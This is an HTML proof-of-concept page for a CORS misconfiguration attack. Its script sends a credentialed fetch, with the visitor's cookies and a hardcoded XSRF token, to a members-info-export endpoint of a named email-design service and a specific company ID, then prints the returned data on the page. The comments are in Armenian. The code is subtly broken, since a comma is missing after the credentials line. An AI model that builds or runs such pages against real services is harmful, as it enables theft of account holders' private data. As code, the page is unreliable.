<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>CORS Proof of Concept</title>
</head>
<body>
    <h2>CORS Vulnerability Test</h2>
    <p>Տվյալների բեռնում...</p>
    <pre id="output" style="background: #f4f4f4; padding: 10px;"></pre>

    <script>
        // Այստեղ գրվում է թիրախային API-ի կամ էջի հասցեն, որտեղից ուզում եք կարդալ տվյալները
        const targetUrl = "https://my.stripo.email/bapi/stripeapi/v3/companies/1800745/members-info-export";

        fetch(targetUrl, {
            method: "GET",
            credentials: "include" // Ավելացվում է, եթե հարցումը պետք է ուղարկի նաև օգտատիրոջ Cookie-ները
            headers: {
                "X-Xsrf-Token": "6b6b1303-01d8-42e0-8765-4ad843a52a9f"
            }
        })
        .then(response => {
            // Ստուգում ենք պատասխանի ստատուսը և վերցնում տեքստը
            return response.text();
        })
        .then(data => {
            // Եթե CORS-ը սխալ է կոնֆիգուրացված, այս կոդը կկարդա և էկրանին դուրս կբերի գաղտնի տվյալները
            console.log("Հաջողվեց կարդալ տվյալները:", data);
            document.getElementById("output").textContent = data;
        })
        .catch(error => {
            // Եթե պաշտպանությունը աշխատում է, բրաուզերը կբլոկավորի և կտա CORS սխալ
            console.error("CORS-ը բլոկավորեց հարցումը:", error);
            document.getElementById("output").textContent = "CORS Policy blocked the request (Protected).";
        });
    </script>
</body>
</html>
